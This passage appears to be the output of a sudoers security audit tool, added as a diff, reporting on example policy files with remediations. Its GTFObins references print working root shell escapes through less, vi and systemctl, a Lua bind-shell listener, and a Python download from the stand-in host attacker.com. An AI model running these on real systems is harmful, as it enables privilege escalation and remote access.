@@ -1,0 +1,1042 @@
+=== SUDOERS SECURITY AUDIT REPORT ===
+
+
+--- Sudoers Policy Findings (41) ---
+[CRITICAL] SUDO-DEF-004: Dangerous Environment Variables Preserved (env_keep)
+  Source Line: Defaults env_keep += "LD_PRELOAD HTTP_PROXY"
+  Location:    docs/examples/policy/sudoers:3
+  Description: The policy explicitly preserves dangerous environment variables: LD_PRELOAD. This can allow local users to alter runtime linker behavior, interpreter module paths, or pager/editor execution in elevated processes.
+  Remediation: Remove dynamic library path, interpreter path, and shell/editor environment variables from 'env_keep' and 'env_check', and keep them in 'env_delete' in sudoers Defaults.
+  Example Fix:
+    Defaults env_keep -= "LD_PRELOAD"
+
+[CRITICAL] SUDO-GTFO-002: Passwordless Dangerous Sudo Binary allowed: systemctl (command)
+  User/Group:  deploy
+  Host:        ALL
+  RunAs:       root
+  Tags:        NOPASSWD:
+  Command:     /usr/bin/systemctl restart nginx.service
+  Source Line: deploy ALL=(root) NOPASSWD: NGINX_OPS
+  Location:    docs/examples/policy/sudoers.d/10-deploy:3
+  Compliance:  MITRE-T1548.003
+  Description: The user(s) [deploy] can run '/usr/bin/systemctl restart nginx.service' via sudo as [root] without a password (NOPASSWD) with the 'command' capability (inherited via less). This can enable privilege escalation if the inherited 'less' behavior can be triggered.
+GTFObins Context: Inherits command behavior from less.
+Note: Pager escape requires a TTY with paged output and is typically restricted on systemd >= 247 (LESSSECURE=1 under sudo) unless PAGER/SYSTEMD_PAGER/LESSSECURE is preserved or overridden.
+Note: Environment-variable techniques (e.g. LESSOPEN/VISUAL/EDITOR) require SETENV or matching env_keep permissions.
+  Remediation: Remove this binary from sudoers or replace it with a tightly scoped wrapper script.
+  Example Fix:
+    # Replace direct 'systemctl' (command) access with a root-owned wrapper script (EXEC: required when global Defaults noexec is active):
+    deploy ALL = (root) PASSWD: EXEC: sha256:<digest> /usr/local/sbin/safe-systemctl-wrapper.sh ""
+  Reference:
+    # Via less (trigger with systemctl):
+    systemctl
+    # From less:
+    LESSOPEN='/path/to/command # %s' less /etc/hosts
+
+[CRITICAL] SUDO-GTFO-002: Passwordless Dangerous Sudo Binary allowed: systemctl (file-read)
+  User/Group:  deploy
+  Host:        ALL
+  RunAs:       root
+  Tags:        NOPASSWD:
+  Command:     /usr/bin/systemctl restart nginx.service
+  Source Line: deploy ALL=(root) NOPASSWD: NGINX_OPS
+  Location:    docs/examples/policy/sudoers.d/10-deploy:3
+  Compliance:  MITRE-T1548.003
+  Description: The user(s) [deploy] can run '/usr/bin/systemctl restart nginx.service' via sudo as [root] without a password (NOPASSWD) with the 'file-read' capability (inherited via less). This can enable privilege escalation if the inherited 'less' behavior can be triggered.
+GTFObins Context: Inherits file-read behavior from less (and transitively via less -> vi).
+Note: Pager escape requires a TTY with paged output and is typically restricted on systemd >= 247 (LESSSECURE=1 under sudo) unless PAGER/SYSTEMD_PAGER/LESSSECURE is preserved or overridden.
+Launching 'vi' from piped 'less' output requires opening a file first (e.g. ':e /path/to/file' then 'v').
+Note: Environment-variable techniques (e.g. LESSOPEN/VISUAL/EDITOR) require SETENV or matching env_keep permissions.
+This can be used to read another file, e.g., when invoked as a pager with some fixed content.
+This can be used to read another file.
+  Remediation: Remove this binary from sudoers or replace it with a tightly scoped wrapper script.
+  Example Fix:
+    # Replace direct 'systemctl' (file-read) access with a root-owned wrapper script (EXEC: required when global Defaults noexec is active):
+    deploy ALL = (root) PASSWD: EXEC: sha256:<digest> /usr/local/sbin/safe-systemctl-wrapper.sh ""
+  Reference:
+    # Via less (trigger with systemctl):
+    systemctl
+    # From less:
+    less /path/to/input-file
+    
+    # Via less (trigger with systemctl):
+    systemctl
+    # From less:
+    less /etc/hosts
+    :e /path/to/input-file
+    
+    # Via less (trigger with systemctl):
+    systemctl
+    # From less:
+    LESSOPEN='echo /path/to/input-file # %s' less /etc/hosts
+    
+    # Via less -> vi (trigger with systemctl):
+    systemctl
+    # From less:
+    less /etc/hosts
+    v
+    # From vi:
+    vi /path/to/input-file
+
+[CRITICAL] SUDO-GTFO-002: Passwordless Dangerous Sudo Binary allowed: systemctl (file-write)
+  User/Group:  deploy
+  Host:        ALL
+  RunAs:       root
+  Tags:        NOPASSWD:
+  Command:     /usr/bin/systemctl restart nginx.service
+  Source Line: deploy ALL=(root) NOPASSWD: NGINX_OPS
+  Location:    docs/examples/policy/sudoers.d/10-deploy:3
+  Compliance:  MITRE-T1548.003
+  Description: The user(s) [deploy] can run '/usr/bin/systemctl restart nginx.service' via sudo as [root] without a password (NOPASSWD) with the 'file-write' capability (inherited via less). This can enable privilege escalation if the inherited 'less' behavior can be triggered.
+GTFObins Context: Inherits file-write behavior from less (and transitively via less -> vi).
+Note: Pager escape requires a TTY with paged output and is typically restricted on systemd >= 247 (LESSSECURE=1 under sudo) unless PAGER/SYSTEMD_PAGER/LESSSECURE is preserved or overridden.
+Launching 'vi' from piped 'less' output requires opening a file first (e.g. ':e /path/to/file' then 'v').
+Where '^[' is the escape key.
+  Remediation: Remove this binary from sudoers or replace it with a tightly scoped wrapper script.
+  Example Fix:
+    # Replace direct 'systemctl' (file-write) access with a root-owned wrapper script (EXEC: required when global Defaults noexec is active):
+    deploy ALL = (root) PASSWD: EXEC: sha256:<digest> /usr/local/sbin/safe-systemctl-wrapper.sh ""
+  Reference:
+    # Via less (trigger with systemctl):
+    systemctl
+    # From less:
+    echo DATA | less
+    s/path/to/output-file
+    q
+    
+    # Via less -> vi (trigger with systemctl):
+    systemctl
+    # From less:
+    less /etc/hosts
+    v
+    # From vi:
+    vi /path/to/output-file
+    iDATA
+    ^[
+    w
+
+[CRITICAL] SUDO-GTFO-002: Passwordless Dangerous Sudo Binary allowed: systemctl (shell)
+  User/Group:  deploy
+  Host:        ALL
+  RunAs:       root
+  Tags:        NOPASSWD:
+  Command:     /usr/bin/systemctl restart nginx.service
+  Source Line: deploy ALL=(root) NOPASSWD: NGINX_OPS
+  Location:    docs/examples/policy/sudoers.d/10-deploy:3
+  Compliance:  MITRE-T1548.003
+  Description: The user(s) [deploy] can run '/usr/bin/systemctl restart nginx.service' via sudo as [root] without a password (NOPASSWD) with the 'shell' capability. This enables immediate privilege escalation.
+GTFObins Context: Inherits shell behavior from less (and transitively via less -> vi).
+Note: Pager escape requires a TTY with paged output and is typically restricted on systemd >= 247 (LESSSECURE=1 under sudo) unless PAGER/SYSTEMD_PAGER/LESSSECURE is preserved or overridden.
+Launching 'vi' from piped 'less' output requires opening a file first (e.g. ':e /path/to/file' then 'v').
+Note: Environment-variable techniques (e.g. LESSOPEN/VISUAL/EDITOR) require SETENV or matching env_keep permissions.
+It might happen that the service is not started with '--now', in such cases it might be necessary to manually start it.
+The optional 'reset' command is needed to receive the echo back of the typed keystrokes.
+  Remediation: Remove this binary from sudoers or replace it with a tightly scoped wrapper script.
+  Example Fix:
+    # Replace direct 'systemctl' (shell) access with a root-owned wrapper script (EXEC: required when global Defaults noexec is active):
+    deploy ALL = (root) PASSWD: EXEC: sha256:<digest> /usr/local/sbin/safe-systemctl-wrapper.sh ""
+  Reference:
+    echo '[Service]
+    Type=oneshot
+    ExecStart=/path/to/command
+    [Install]
+    WantedBy=multi-user.target' >/path/to/temp-file.service
+    systemctl link /path/to/temp-file.service
+    systemctl enable --now /path/to/temp-file.service
+    
+    echo /bin/sh >/path/to/temp-file
+    chmod +x /path/to/temp-file
+    SYSTEMD_EDITOR=/path/to/temp-file systemctl edit basic.target
+    
+    # Via less (trigger with systemctl):
+    systemctl
+    # From less:
+    less /etc/hosts
+    !/bin/sh
+    
+    # Via less (trigger with systemctl):
+    systemctl
+    # From less:
+    LESSOPEN="/bin/sh -s 1>&0 2>&0 # %s" less /etc/hosts
+    reset
+    
+    # Via less (trigger with systemctl):
+    systemctl
+    # From less:
+    VISUAL='/bin/sh -s --' less /etc/hosts
+    v
+    
+    # Via less -> vi (trigger with systemctl):
+    systemctl
+    # From less:
+    less /etc/hosts
+    v
+    # From vi:
+    vi -c ':!/bin/sh' /dev/null
+    
+    # Via less -> vi (trigger with systemctl):
+    systemctl
+    # From less:
+    less /etc/hosts
+    v
+    # From vi:
+    vi -c ':shell'
+    
+    # Via less -> vi (trigger with systemctl):
+    systemctl
+    # From less:
+    less /etc/hosts
+    v
+    # From vi:
+    vi -c ':set shell=/bin/sh | shell'
+    
+    # Via less -> vi (trigger with systemctl):
+    systemctl
+    # From less:
+    less /etc/hosts
+    v
+    # From vi:
+    vi -c :terminal /bin/sh
+
+[CRITICAL] SUDO-GTFO-002: Passwordless Dangerous Sudo Binary allowed: systemctl (command)
+  User/Group:  deploy
+  Host:        ALL
+  RunAs:       root
+  Tags:        NOPASSWD:
+  Command:     /usr/bin/systemctl status nginx.service
+  Source Line: deploy ALL=(root) NOPASSWD: NGINX_OPS
+  Location:    docs/examples/policy/sudoers.d/10-deploy:3
+  Compliance:  MITRE-T1548.003
+  Description: The user(s) [deploy] can run '/usr/bin/systemctl status nginx.service' via sudo as [root] without a password (NOPASSWD) with the 'command' capability (inherited via less). This can enable privilege escalation if the inherited 'less' behavior can be triggered.
+GTFObins Context: Inherits command behavior from less.
+Note: Pager escape requires a TTY with paged output and is typically restricted on systemd >= 247 (LESSSECURE=1 under sudo) unless PAGER/SYSTEMD_PAGER/LESSSECURE is preserved or overridden.
+Note: Environment-variable techniques (e.g. LESSOPEN/VISUAL/EDITOR) require SETENV or matching env_keep permissions.
+  Remediation: Remove this binary from sudoers or replace it with a tightly scoped wrapper script.
+  Example Fix:
+    # Replace direct 'systemctl' (command) access with a root-owned wrapper script (EXEC: required when global Defaults noexec is active):
+    deploy ALL = (root) PASSWD: EXEC: sha256:<digest> /usr/local/sbin/safe-systemctl-wrapper.sh ""
+  Reference:
+    # Via less (trigger with systemctl):
+    systemctl
+    # From less:
+    LESSOPEN='/path/to/command # %s' less /etc/hosts
+
+[CRITICAL] SUDO-GTFO-002: Passwordless Dangerous Sudo Binary allowed: systemctl (file-read)
+  User/Group:  deploy
+  Host:        ALL
+  RunAs:       root
+  Tags:        NOPASSWD:
+  Command:     /usr/bin/systemctl status nginx.service
+  Source Line: deploy ALL=(root) NOPASSWD: NGINX_OPS
+  Location:    docs/examples/policy/sudoers.d/10-deploy:3
+  Compliance:  MITRE-T1548.003
+  Description: The user(s) [deploy] can run '/usr/bin/systemctl status nginx.service' via sudo as [root] without a password (NOPASSWD) with the 'file-read' capability (inherited via less). This can enable privilege escalation if the inherited 'less' behavior can be triggered.
+GTFObins Context: Inherits file-read behavior from less (and transitively via less -> vi).
+Note: Pager escape requires a TTY with paged output and is typically restricted on systemd >= 247 (LESSSECURE=1 under sudo) unless PAGER/SYSTEMD_PAGER/LESSSECURE is preserved or overridden.
+Launching 'vi' from piped 'less' output requires opening a file first (e.g. ':e /path/to/file' then 'v').
+Note: Environment-variable techniques (e.g. LESSOPEN/VISUAL/EDITOR) require SETENV or matching env_keep permissions.
+This can be used to read another file, e.g., when invoked as a pager with some fixed content.
+This can be used to read another file.
+  Remediation: Remove this binary from sudoers or replace it with a tightly scoped wrapper script.
+  Example Fix:
+    # Replace direct 'systemctl' (file-read) access with a root-owned wrapper script (EXEC: required when global Defaults noexec is active):
+    deploy ALL = (root) PASSWD: EXEC: sha256:<digest> /usr/local/sbin/safe-systemctl-wrapper.sh ""
+  Reference:
+    # Via less (trigger with systemctl):
+    systemctl
+    # From less:
+    less /path/to/input-file
+    
+    # Via less (trigger with systemctl):
+    systemctl
+    # From less:
+    less /etc/hosts
+    :e /path/to/input-file
+    
+    # Via less (trigger with systemctl):
+    systemctl
+    # From less:
+    LESSOPEN='echo /path/to/input-file # %s' less /etc/hosts
+    
+    # Via less -> vi (trigger with systemctl):
+    systemctl
+    # From less:
+    less /etc/hosts
+    v
+    # From vi:
+    vi /path/to/input-file
+
+[CRITICAL] SUDO-GTFO-002: Passwordless Dangerous Sudo Binary allowed: systemctl (file-write)
+  User/Group:  deploy
+  Host:        ALL
+  RunAs:       root
+  Tags:        NOPASSWD:
+  Command:     /usr/bin/systemctl status nginx.service
+  Source Line: deploy ALL=(root) NOPASSWD: NGINX_OPS
+  Location:    docs/examples/policy/sudoers.d/10-deploy:3
+  Compliance:  MITRE-T1548.003
+  Description: The user(s) [deploy] can run '/usr/bin/systemctl status nginx.service' via sudo as [root] without a password (NOPASSWD) with the 'file-write' capability (inherited via less). This can enable privilege escalation if the inherited 'less' behavior can be triggered.
+GTFObins Context: Inherits file-write behavior from less (and transitively via less -> vi).
+Note: Pager escape requires a TTY with paged output and is typically restricted on systemd >= 247 (LESSSECURE=1 under sudo) unless PAGER/SYSTEMD_PAGER/LESSSECURE is preserved or overridden.
+Launching 'vi' from piped 'less' output requires opening a file first (e.g. ':e /path/to/file' then 'v').
+Where '^[' is the escape key.
+  Remediation: Remove this binary from sudoers or replace it with a tightly scoped wrapper script.
+  Example Fix:
+    # Replace direct 'systemctl' (file-write) access with a root-owned wrapper script (EXEC: required when global Defaults noexec is active):
+    deploy ALL = (root) PASSWD: EXEC: sha256:<digest> /usr/local/sbin/safe-systemctl-wrapper.sh ""
+  Reference:
+    # Via less (trigger with systemctl):
+    systemctl
+    # From less:
+    echo DATA | less
+    s/path/to/output-file
+    q
+    
+    # Via less -> vi (trigger with systemctl):
+    systemctl
+    # From less:
+    less /etc/hosts
+    v
+    # From vi:
+    vi /path/to/output-file
+    iDATA
+    ^[
+    w
+
+[CRITICAL] SUDO-GTFO-002: Passwordless Dangerous Sudo Binary allowed: systemctl (shell)
+  User/Group:  deploy
+  Host:        ALL
+  RunAs:       root
+  Tags:        NOPASSWD:
+  Command:     /usr/bin/systemctl status nginx.service
+  Source Line: deploy ALL=(root) NOPASSWD: NGINX_OPS
+  Location:    docs/examples/policy/sudoers.d/10-deploy:3
+  Compliance:  MITRE-T1548.003
+  Description: The user(s) [deploy] can run '/usr/bin/systemctl status nginx.service' via sudo as [root] without a password (NOPASSWD) with the 'shell' capability. This enables immediate privilege escalation.
+GTFObins Context: Inherits shell behavior from less (and transitively via less -> vi).
+Note: Pager escape requires a TTY with paged output and is typically restricted on systemd >= 247 (LESSSECURE=1 under sudo) unless PAGER/SYSTEMD_PAGER/LESSSECURE is preserved or overridden.
+Launching 'vi' from piped 'less' output requires opening a file first (e.g. ':e /path/to/file' then 'v').
+Note: Environment-variable techniques (e.g. LESSOPEN/VISUAL/EDITOR) require SETENV or matching env_keep permissions.
+It might happen that the service is not started with '--now', in such cases it might be necessary to manually start it.
+The optional 'reset' command is needed to receive the echo back of the typed keystrokes.
+  Remediation: Remove this binary from sudoers or replace it with a tightly scoped wrapper script.
+  Example Fix:
+    # Replace direct 'systemctl' (shell) access with a root-owned wrapper script (EXEC: required when global Defaults noexec is active):
+    deploy ALL = (root) PASSWD: EXEC: sha256:<digest> /usr/local/sbin/safe-systemctl-wrapper.sh ""
+  Reference:
+    echo '[Service]
+    Type=oneshot
+    ExecStart=/path/to/command
+    [Install]
+    WantedBy=multi-user.target' >/path/to/temp-file.service
+    systemctl link /path/to/temp-file.service
+    systemctl enable --now /path/to/temp-file.service
+    
+    echo /bin/sh >/path/to/temp-file
+    chmod +x /path/to/temp-file
+    SYSTEMD_EDITOR=/path/to/temp-file systemctl edit basic.target
+    
+    # Via less (trigger with systemctl):
+    systemctl
+    # From less:
+    less /etc/hosts
+    !/bin/sh
+    
+    # Via less (trigger with systemctl):
+    systemctl
+    # From less:
+    LESSOPEN="/bin/sh -s 1>&0 2>&0 # %s" less /etc/hosts
+    reset
+    
+    # Via less (trigger with systemctl):
+    systemctl
+    # From less:
+    VISUAL='/bin/sh -s --' less /etc/hosts
+    v
+    
+    # Via less -> vi (trigger with systemctl):
+    systemctl
+    # From less:
+    less /etc/hosts
+    v
+    # From vi:
+    vi -c ':!/bin/sh' /dev/null
+    
+    # Via less -> vi (trigger with systemctl):
+    systemctl
+    # From less:
+    less /etc/hosts
+    v
+    # From vi:
+    vi -c ':shell'
+    
+    # Via less -> vi (trigger with systemctl):
+    systemctl
+    # From less:
+    less /etc/hosts
+    v
+    # From vi:
+    vi -c ':set shell=/bin/sh | shell'
+    
+    # Via less -> vi (trigger with systemctl):
+    systemctl
+    # From less:
+    less /etc/hosts
+    v
+    # From vi:
+    vi -c :terminal /bin/sh
+
+[CRITICAL] SUDO-DEF-012: Password Authentication Disabled in Scoped Defaults (!authenticate)
+  User/Group:  ops
+  Source Line: Defaults:ops !authenticate
+  Location:    docs/examples/policy/sudoers.d/20-ops:2
+  Compliance:  CIS-5.2.5
+  Description: Scoped Defaults for [ops] sets '!authenticate', disabling password prompts for all matching rules.
+  Remediation: Remove '!authenticate' from Defaults for [ops].
+  Example Fix:
+    Defaults:ops authenticate
+
+[CRITICAL] SUDO-GTFO-002: Passwordless Dangerous Sudo Binary allowed: less (command)
+  User/Group:  ops
+  Host:        ALL
+  RunAs:       root
+  Defaults:    Defaults:ops !authenticate
+  Command:     /usr/bin/less /var/log/syslog
+  Source Line: ops ALL=(root) /usr/bin/less /var/log/syslog
+  Location:    docs/examples/policy/sudoers.d/20-ops:3
+  Compliance:  MITRE-T1548.003
+  Description: The user(s) [ops] can run '/usr/bin/less /var/log/syslog' via sudo as [root] without a password (NOPASSWD) with the 'command' capability. This enables immediate privilege escalation.
+  Remediation: Remove this binary from sudoers or replace it with a tightly scoped wrapper script.
+  Example Fix:
+    # Enforce NOEXEC and explicit arguments, or replace with a dedicated wrapper script:
+    ops ALL = (root) PASSWD: NOEXEC: /usr/bin/less /var/log/syslog
+  Reference:
+    LESSOPEN='/path/to/command # %s' less /etc/hosts
+
+[CRITICAL] SUDO-GTFO-002: Passwordless Dangerous Sudo Binary allowed: less (file-read)
+  User/Group:  ops
+  Host:        ALL
+  RunAs:       root
+  Defaults:    Defaults:ops !authenticate
+  Command:     /usr/bin/less /var/log/syslog
+  Source Line: ops ALL=(root) /usr/bin/less /var/log/syslog
+  Location:    docs/examples/policy/sudoers.d/20-ops:3
+  Compliance:  MITRE-T1548.003
+  Description: The user(s) [ops] can run '/usr/bin/less /var/log/syslog' via sudo as [root] without a password (NOPASSWD) with the 'file-read' capability. This enables immediate privilege escalation.
+GTFObins Context: Inherits file-read behavior from vi.
+This can be used to read another file, e.g., when invoked as a pager with some fixed content.
+This can be used to read another file.
+  Remediation: Remove this binary from sudoers or replace it with a tightly scoped wrapper script.
+  Example Fix:
+    # Replace direct 'less' (file-read) access with a root-owned wrapper script (EXEC: required when global Defaults noexec is active):
+    ops ALL = (root) PASSWD: EXEC: sha256:<digest> /usr/local/sbin/safe-less-wrapper.sh ""
+  Reference:
+    less /path/to/input-file
+    
+    less /etc/hosts
+    :e /path/to/input-file
+    
+    LESSOPEN='echo /path/to/input-file # %s' less /etc/hosts
+    
+    # Via vi (trigger with less):
+    less /etc/hosts
+    v
+    # From vi:
+    vi /path/to/input-file
+
+[CRITICAL] SUDO-GTFO-002: Passwordless Dangerous Sudo Binary allowed: less (file-write)
+  User/Group:  ops
+  Host:        ALL
+  RunAs:       root
+  Defaults:    Defaults:ops !authenticate
+  Command:     /usr/bin/less /var/log/syslog
+  Source Line: ops ALL=(root) /usr/bin/less /var/log/syslog
+  Location:    docs/examples/policy/sudoers.d/20-ops:3
+  Compliance:  MITRE-T1548.003
+  Description: The user(s) [ops] can run '/usr/bin/less /var/log/syslog' via sudo as [root] without a password (NOPASSWD) with the 'file-write' capability. This enables immediate privilege escalation.
+GTFObins Context: Inherits file-write behavior from vi.
+Where '^[' is the escape key.
+  Remediation: Remove this binary from sudoers or replace it with a tightly scoped wrapper script.
+  Example Fix:
+    # Replace direct 'less' (file-write) access with a root-owned wrapper script (EXEC: required when global Defaults noexec is active):
+    ops ALL = (root) PASSWD: EXEC: sha256:<digest> /usr/local/sbin/safe-less-wrapper.sh ""
+  Reference:
+    echo DATA | less
+    s/path/to/output-file
+    q
+    
+    # Via vi (trigger with less):
+    less /etc/hosts
+    v
+    # From vi:
+    vi /path/to/output-file
+    iDATA
+    ^[
+    w
+
+[CRITICAL] SUDO-GTFO-002: Passwordless Dangerous Sudo Binary allowed: less (shell)
+  User/Group:  ops
+  Host:        ALL
+  RunAs:       root
+  Defaults:    Defaults:ops !authenticate
+  Command:     /usr/bin/less /var/log/syslog
+  Source Line: ops ALL=(root) /usr/bin/less /var/log/syslog
+  Location:    docs/examples/policy/sudoers.d/20-ops:3
+  Compliance:  MITRE-T1548.003
+  Description: The user(s) [ops] can run '/usr/bin/less /var/log/syslog' via sudo as [root] without a password (NOPASSWD) with the 'shell' capability. This enables immediate privilege escalation.
+GTFObins Context: Inherits shell behavior from vi.
+The optional 'reset' command is needed to receive the echo back of the typed keystrokes.
+  Remediation: Remove this binary from sudoers or replace it with a tightly scoped wrapper script.
+  Example Fix:
+    # Enforce NOEXEC and explicit arguments, or replace with a dedicated wrapper script:
+    ops ALL = (root) PASSWD: NOEXEC: /usr/bin/less /var/log/syslog
+  Reference:
+    less /etc/hosts
+    !/bin/sh
+    
+    LESSOPEN="/bin/sh -s 1>&0 2>&0 # %s" less /etc/hosts
+    reset
+    
+    VISUAL='/bin/sh -s --' less /etc/hosts
+    v
+    
+    # Via vi (trigger with less):
+    less /etc/hosts
+    v
+    # From vi:
+    vi -c ':!/bin/sh' /dev/null
+    
+    # Via vi (trigger with less):
+    less /etc/hosts
+    v
+    # From vi:
+    vi -c ':shell'
+    
+    # Via vi (trigger with less):
+    less /etc/hosts
+    v
+    # From vi:
+    vi -c ':set shell=/bin/sh | shell'
+    
+    # Via vi (trigger with less):
+    less /etc/hosts
+    v
+    # From vi:
+    vi -c :terminal /bin/sh
+
+[CRITICAL] SUDO-GTFO-002: Passwordless Dangerous Sudo Binary allowed: cat (file-read)
+  User/Group:  ops
+  Host:        ALL
+  RunAs:       root
+  Defaults:    Defaults:ops !authenticate
+  Command:     /usr/bin/cat /var/log/*
+  Source Line: ops ALL=(root) /usr/bin/cat /var/log/*
+  Location:    docs/examples/policy/sudoers.d/20-ops:4
+  Compliance:  MITRE-T1548.003
+  Description: The user(s) [ops] can run '/usr/bin/cat /var/log/*' via sudo as [root] without a password (NOPASSWD) with the 'file-read' capability. This enables immediate privilege escalation.
+  Remediation: Remove this binary from sudoers or replace it with a tightly scoped wrapper script.
+  Example Fix:
+    # Replace direct 'cat' (file-read) access with a root-owned wrapper script (EXEC: required when global Defaults noexec is active):
+    ops ALL = (root) PASSWD: EXEC: sha256:<digest> /usr/local/sbin/safe-cat-wrapper.sh ""
+  Reference:
+    cat /path/to/input-file
+
+[HIGH] SUDO-DEF-005: visiblepw Flag Enabled
+  Source Line: Defaults visiblepw
+  Location:    docs/examples/policy/sudoers:4
+  Description: The 'visiblepw' option is enabled globally. This forces sudo to print the password in cleartext if prompting on a terminal without echo suppression, exposing it to shoulder surfing or screen logs.
+  Remediation: Remove 'Defaults visiblepw' or explicitly set 'Defaults !visiblepw'.
+  Example Fix:
+    Defaults !visiblepw
+
+[HIGH] SUDO-DEF-002: Dangerous path in secure_path
+  Source Line: Defaults secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/tmp"
+  Location:    docs/examples/policy/sudoers:6
+  Description: The 'secure_path' contains a temporary or user-writable directory entry: '/tmp'. This can allow local users to hijack commands if a malicious binary is placed in the unsafe target path.
+  Remediation: Only specify absolute, root-owned system directories without traversal or writable paths in secure_path.
+  Example Fix:
+    Defaults secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+
+[HIGH] SUDO-CMD-002: Full Root Privileges Allowed
+  User/Group:  root
+  Host:        ALL
+  RunAs:       ALL : %ALL
+  Tags:        SETENV:
+  Command:     ALL
+  Source Line: root ALL=(ALL:ALL) ALL
+  Location:    docs/examples/policy/sudoers:8
+  Compliance:  ANSSI-BP-028 R43
+  Description: The policy allows user(s) [root] to run any command (ALL) on host(s) [ALL] as [ALL : %ALL]. This grants full administrative control.
+  Remediation: Restrict privileges to only the specific commands required for the user's role.
+  Example Fix:
+    Cmnd_Alias ALLOWED_CMDS = /usr/bin/systemctl restart app, /usr/bin/systemctl status app
+    root ALL = (ALL : %ALL) ALLOWED_CMDS
+
+[HIGH] SUDO-CMD-009: Environment Override Permitted on Command (SETENV)
+  User/Group:  root
+  Host:        ALL
+  RunAs:       ALL : %ALL
+  Tags:        SETENV:
+  Source Line: root ALL=(ALL:ALL) ALL
+  Location:    docs/examples/policy/sudoers:8
+  Description: The command specification for user(s) [root] permits 'ALL', which implicitly enables 'SETENV' in sudoers unless 'NOSETENV:' is specified, allowing the user to pass arbitrary environment variables to commands run as [ALL : %ALL].
+  Remediation: Replace 'ALL' with explicit commands, or add the 'NOSETENV:' tag to suppress the implied SETENV permission.
+  Example Fix:
+    root ALL = (ALL : %ALL) NOSETENV: /usr/bin/command ""
+
+[HIGH] SUDO-CMD-002: Full Root Privileges Allowed
+  User/Group:  %wheel
+  Host:        ALL
+  RunAs:       ALL
+  Tags:        SETENV:
+  Command:     ALL
+  Source Line: %wheel ALL=(ALL) ALL
+  Location:    docs/examples/policy/sudoers:9
+  Compliance:  ANSSI-BP-028 R43
+  Description: The policy allows user(s) [%wheel] to run any command (ALL) on host(s) [ALL] as [ALL]. This grants full administrative control.
+  Remediation: Restrict privileges to only the specific commands required for the user's role.
+  Example Fix:
+    Cmnd_Alias ALLOWED_CMDS = /usr/bin/systemctl restart app, /usr/bin/systemctl status app
+    %wheel ALL = (ALL) ALLOWED_CMDS
+
+[HIGH] SUDO-CMD-009: Environment Override Permitted on Command (SETENV)
+  User/Group:  %wheel
+  Host:        ALL
+  RunAs:       ALL
+  Tags:        SETENV:
+  Source Line: %wheel ALL=(ALL) ALL
+  Location:    docs/examples/policy/sudoers:9
+  Description: The command specification for user(s) [%wheel] permits 'ALL', which implicitly enables 'SETENV' in sudoers unless 'NOSETENV:' is specified, allowing the user to pass arbitrary environment variables to commands run as [ALL].
+  Remediation: Replace 'ALL' with explicit commands, or add the 'NOSETENV:' tag to suppress the implied SETENV permission.
+  Example Fix:
+    %wheel ALL = (ALL) NOSETENV: /usr/bin/command ""
+
+[HIGH] SUDO-CMD-007: Direct Text Editor Execution via Sudo
+  User/Group:  deploy
+  Host:        ALL
+  RunAs:       root
+  Command:     /usr/bin/vim /etc/nginx/nginx.conf
+  Source Line: deploy ALL=(root) /usr/bin/vim /etc/nginx/nginx.conf
+  Location:    docs/examples/policy/sudoers.d/10-deploy:4
+  Compliance:  ANSSI-BP-028 R44
+  Description: The command '/usr/bin/vim /etc/nginx/nginx.conf' allowed for user(s) [deploy] invokes a text editor directly under sudo. Text editors typically allow escaping to a shell or editing arbitrary system files. Use 'sudoedit' instead to safely edit files with current user privileges.
+  Remediation: Replace direct text editor execution rules with 'sudoedit' permissions for specific files.
+  Example Fix:
+    Defaults !sudoedit_follow, sudoedit_checkdir
+    deploy ALL = (root) sudoedit /etc/nginx/nginx.conf
+
+[HIGH] SUDO-GTFO-001: Dangerous Sudo Binary allowed: vim (bind-shell)
+  User/Group:  deploy
+  Host:        ALL
+  RunAs:       root
+  Command:     /usr/bin/vim /etc/nginx/nginx.conf
+  Source Line: deploy ALL=(root) /usr/bin/vim /etc/nginx/nginx.conf
+  Location:    docs/examples/policy/sudoers.d/10-deploy:4
+  Compliance:  MITRE-T1548.003
+  Description: The user(s) [deploy] can run '/usr/bin/vim /etc/nginx/nginx.conf' via sudo as [root], which is listed in GTFObins with the 'bind-shell' capability.
+GTFObins Context: Inherits bind-shell behavior from lua.
+This allows to run Lua code ('...').
+This requires 'lua-socket' to be available.
+  Remediation: Remove this binary from sudoers or replace it with a tightly scoped wrapper script.
+  Example Fix:
+    Defaults !sudoedit_follow, sudoedit_checkdir
+    deploy ALL = (root) sudoedit /etc/nginx/nginx.conf
+  Reference:
+    # Via lua (trigger with vim):
+    vim -c ':lua ...'
+    # From lua:
+    lua -e '
+      local k=require("socket");
+      local s=assert(k.bind("*",12345));
+      local c=s:accept();
+      while true do
+        local r,x=c:receive();local f=assert(io.popen(r,"r"));
+        local b=assert(f:read("*a"));c:send(b);
+      end;c:close();f:close();'
+
+[HIGH] SUDO-GTFO-001: Dangerous Sudo Binary allowed: vim (download)
+  User/Group:  deploy
+  Host:        ALL
+  RunAs:       root
+  Command:     /usr/bin/vim /etc/nginx/nginx.conf
+  Source Line: deploy ALL=(root) /usr/bin/vim /etc/nginx/nginx.conf
+  Location:    docs/examples/policy/sudoers.d/10-deploy:4
+  Compliance:  MITRE-T1548.003
+  Description: The user(s) [deploy] can run '/usr/bin/vim /etc/nginx/nginx.conf' via sudo as [root], which is listed in GTFObins with the 'download' capability.
+GTFObins Context: Inherits download behavior from python, lua.
+This allows to run Python code ('...').
+This allows to run Lua code ('...').
+This requires 'lua-socket' to be available.
+  Remediation: Remove this binary from sudoers or replace it with a tightly scoped wrapper script.
+  Example Fix:
+    Defaults !sudoedit_follow, sudoedit_checkdir
+    deploy ALL = (root) sudoedit /etc/nginx/nginx.conf
+  Reference:
+    # Via python (trigger with vim):
+    vim -c ':py ...'
+    # From python:
+    python -c 'import sys; from os import environ as e
+    if sys.version_info.major == 3: import urllib.request as r
+    else: import urllib as r
+    r.urlretrieve("http://attacker.com/path/to/input-file", "/path/to/output-file")'
+    
+    # Via lua (trigger with vim):
+    vim -c ':lua ...'
+    # From lua:
+    lua -e '
+      local k=require("socket");
+      local s=assert(k.bind("*",12345));
+      local c=s:accept();
+      local d,x=c:receive("*a");
+      c:close();
+      local f=io.open("/path/to/output-file", "wb");
+      f:write(d);
+      io.close(f);'
+
+[HIGH] SUDO-GTFO-001: Dangerous Sudo Binary allowed: vim (file-read)
+  User/Group:  deploy
+  Host:        ALL
+  RunAs:       root
